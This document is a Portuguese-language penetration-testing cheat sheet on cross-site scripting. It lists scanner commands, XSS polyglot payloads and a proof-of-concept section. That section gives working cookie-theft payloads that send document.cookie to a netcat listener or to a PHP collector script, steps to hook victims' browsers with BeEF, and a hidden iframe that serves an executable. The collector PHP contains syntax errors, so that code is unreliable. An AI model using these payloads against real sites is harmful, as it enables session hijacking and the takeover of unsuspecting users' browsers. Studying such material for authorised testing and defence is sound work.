# 4.1)XSS (Cross Site Scripting)
## Reflected (Refletido)	
Inserção de script em um parâmetro de input, a string inserida é retornada na resposta ao usuário. Vulnerabilidade utilizada em ataques de Engenharia Social. 

## Stored (Armazenado)
Inserção de script em um input que fica armazenado na página ou no servidor. Impacto maior por atingir um maior número de alvos.

### ----- Descoberta ----- (Obs.: Deve ser mudado para seção de análise de vulnerabilidade)
Automatizada:
  * Arachni - service postgresql start 
	./arachni_web
  * nmap -p80 --script=http-stored-xss --script.args=httpspider.maxcount=200
	ou --script=http-dombased-xss --script.args=httpspider.maxcount=200
	ou --script=http-phpself-xss --script.args=httpspider.maxcount=200
  * xsser -c100 --Cw=4 -u http://127.0.0.1
	--gtk (para interface gráfica)

Manual:
  * <script>alert('Ola Mundo')</script>
  * <script>alert(document.cookie)</script><br/>
  * <script>alert(document.domain)</script><br/>
  * xss hunter: necessário realizar cadastro na plataforma<br/>
    "><script src=https://<your_page>.xss.ht></script><br/>
    evite filtros da tag <script> utilizando diferentes payloads: https://xsshunter.com/app --> payloads 
			
  * ultimate polyglot: união de tags de diferentes linguagens.<br/>
   1. https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot<br/>
   2. https://github.com/s0md3v/AwesomeXSS<br/>
   3. https://github.com/jhaddix/tbhm/blob/master/05_XSS.md<br/>
```html
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e 
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
  ';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```
## ----- Prova de Conceito -----
  * adquirir Cookie do alvo: 
   1. iniciar um listener: nc -nlvp 8081
   2. input do alvo: <script>new Image().src="http://127.0.0.1:<port_8081>/<not_important>.php?"+document.cookie;</script>

  * BEEF - Framework
   1. 127.0.0.1:3000/ui/authentication
    * user: beef passwd: beef
   2. criar código malicioso (ex: <script src="http://127.0.0.1:3000/hook.js"></script>)
   3. injetar o _payload_ no parâmetro vulnerável
   4. enviar a _URL_ para vítima e esperar que ela navegue no web site
   5. selecionar o IP da vítima na Interface Gráfica do BEEF e executar comandos (alguns comandos podem demorar para produzir resultados)

  * Código PHP para captura de informações sobre a vítima<br/>
    <script>new Image().src="http://127.0.0.1:8081;"</script><br/>
    obs.: qualquer número de porta
    obs2.: para receber mais de uma conexão no listener: socat TCP-LISTEN:8081,reuseaddr,fork -
   * coletor.php			
```php
	<?php 
		$cookie=$_GET[cookie'];
		$useragent=$_SERVER[HTTP_USER_AGENT'];
		$file=fopen(cookie.txt','a');
		fwrite($file,"USER AGENT:$useragent || COOKIE:$cookie \n")
		fclose($file)
	?>
```
  1. nano /var/www/html/cookie.txt
  2. service apache2 start
  3. tail -f cookie.txt
  4. injetar _payload_: <script>new Image().src="http:<ip_addr>/coletor.php?cookie="+document.cookie;</script>

  * Problemas de tamanho de campo no _client side_
   1 limited field: Inspect element -> maxlength -> edit -> enter

  * Execução de arquivo remoto
   1 <iframe src="http://127.0.0.1/file.exe" height="0" width="0"></iframe>
